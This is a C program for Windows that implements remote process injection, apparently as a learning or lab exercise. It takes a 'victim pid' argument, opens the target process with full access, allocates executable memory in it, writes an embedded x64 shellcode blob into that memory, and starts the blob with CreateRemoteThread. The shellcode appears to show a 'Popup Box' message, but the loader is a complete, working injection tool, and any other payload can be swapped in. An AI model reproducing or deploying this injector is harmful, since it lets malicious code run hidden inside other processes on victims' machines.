#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[]){
  unsigned char openPopup_exe[] = 
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
"\x51\x41\x50\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x51\x56"
"\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31"
"\xc9\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51"
"\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
"\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\x50\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41"
"\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41"
"\x58\x41\x58\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41"
"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\xd0"
"\x85\x2c\xa2\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x0a"
"\x00\x00\x00\x50\x6f\x70\x75\x70\x20\x42\x6f\x78\x00\x5a"
"\xe8\x08\x00\x00\x00\x53\x75\x63\x63\x65\x73\x73\x00\x41"
"\x58\x48\x31\xc9\x41\xba\xa3\x0a\xca\x51\xff\xd5\xbb\x9b"
"\xdb\x31\xf0\x41\xba\x61\x53\xc5\x83\xff\xd5\x48\x83\xc4"
"\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x92\x3a\x27"
"\x48\x6a\x00\x59\x41\x89\xda\xff\xd5";




    if(argc != 2){
        printf("Usage: %s <victim pid>\n", argv[0]);
        return FALSE;
    }
    
    DWORD pid = (DWORD)atoi(argv[1]);
    printf("%i", pid);
    
    // 1. Open process
    HANDLE remoteHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );
    
    if(!remoteHandle){
        printf("[!] Failed to open process %d: %d\n", pid, GetLastError());
        return FALSE;
    }
    printf("[+] Opened process handle\n");
    
    // 2. Allocate memory
    PVOID rb = VirtualAllocEx(
        remoteHandle,
        NULL,
        sizeof(openPopup_exe),
        (  MEM_RESERVE | MEM_COMMIT),
        PAGE_EXECUTE_READWRITE
    );
    
    if(!rb){
        printf("[!] Failed to allocate memory: %d\n", GetLastError());
        CloseHandle(remoteHandle);
        return FALSE;
    }
    printf("[+] Allocated %zu bytes at 0x%p\n", sizeof(openPopup_exe), rb);
    
    // 3. Write payload
    if(!WriteProcessMemory(remoteHandle, rb, openPopup_exe, sizeof(openPopup_exe), NULL)){
        printf("[!] Failed to write memory: %d\n", GetLastError());
        VirtualFreeEx(remoteHandle, rb, 0, MEM_RELEASE);
        CloseHandle(remoteHandle);
        return FALSE;
    }
    printf("[+] Wrote payload to memory\n");
    
    // 4. Create remote thread
    HANDLE remoteThread = CreateRemoteThread(
        remoteHandle,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)rb,
        NULL,
        0,
        NULL
    );
    
    if(!remoteThread){
        printf("[!] Failed to create remote thread: %d\n", GetLastError());
        VirtualFreeEx(remoteHandle, rb, 0, MEM_RELEASE);
        CloseHandle(remoteHandle);
        return FALSE;
    }
    printf("[+] Created remote thread successfully\n");
    
    // 5. Wait for thread to finish (optional)
    // WaitForSingleObject(remoteThread, INFINITE);
    // printf("[+] Thread execution completed\n");
    
    // 6. Cleanup
    // CloseHandle(remoteThread);
    // VirtualFreeEx(remoteHandle, rb, 0, MEM_RELEASE);
    CloseHandle(remoteHandle);
    
    printf("[+] Injection complete!\n");
    return TRUE;
}